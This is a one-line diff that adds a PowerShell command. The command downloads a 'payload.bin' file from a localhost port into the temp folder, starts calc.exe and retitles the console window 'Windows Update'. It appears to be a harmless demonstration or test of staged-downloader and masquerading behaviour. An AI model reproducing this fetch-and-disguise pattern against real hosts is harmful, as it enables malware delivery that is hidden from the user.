@@ -1,0 +1,1 @@
+$TargetUrl = "https://localhost:9001/payload.bin"; $Stage2Path = "$env:TEMP\stage1.bin"; Invoke-WebRequest -Uri $TargetUrl -OutFile $Stage2Path -UseBasicParsing; Start-Process -FilePath "calc.exe"; $Host.UI.RawUI.WindowTitle = "Windows Update"
